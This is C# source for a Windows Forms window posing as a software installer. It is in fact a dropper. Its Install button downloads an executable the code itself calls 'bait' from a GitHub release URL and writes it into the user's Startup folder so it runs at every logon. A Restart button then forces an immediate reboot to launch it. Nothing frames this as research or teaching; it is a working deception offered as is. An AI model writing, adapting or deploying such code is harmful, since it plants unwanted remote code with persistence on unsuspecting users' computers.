using System.Diagnostics.CodeAnalysis;
using System.Diagnostics;

namespace Installer
{
    public partial class Window : Form
    {
        private static String DOWNLOAD_BAIT_URL = "https://github.com/Txreq/gaben/releases/download/1.0.0/gaben.exe";
        private byte[]? data;
        private bool isBaitDownloaded = false;

        public Window()
        {
            InitializeComponent();
        }

        private void InstallButton_Click(object sender, EventArgs e)
        {
            if (!isBaitDownloaded)
            {
                SetupBait();
            }
            else
            {
                RestartSystem();
            }
        }

        private async void SetupBait()
        {
            ResponseLabel.Text = string.Empty;
            InstallButton.Enabled = false;
            InstallButton.Text = "Installing...";
            String Path = $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\gaben.exe";

            if (data is null)
                await DownloadData();

            if (data is null)
            {
                InstallButton.Enabled = true;
                InstallButton.Text = "Install";
                return;
            }


            File.WriteAllBytes(Path, data);
            isBaitDownloaded = true;
            InstallButton.Enabled = true;
            InstallButton.Text = "Restart";
            Paragraph.Text = "A system restart may be required.";

        }

        [MemberNotNullWhen(true, nameof(data))]
        private async Task<bool> DownloadData()
        {

            HttpClient client = new HttpClient();
            HttpResponseMessage response = await client.GetAsync(DOWNLOAD_BAIT_URL);

            if (!response.IsSuccessStatusCode)
            {
                ResponseLabel.Text = $"{response.StatusCode}: {response.ReasonPhrase}";
                return false;
            }

            data = await response.Content.ReadAsByteArrayAsync();

            return true;
        }

        static private void RestartSystem()
        {
            Process.Start("shutdown", "/r /t 0");
        }
    }
}
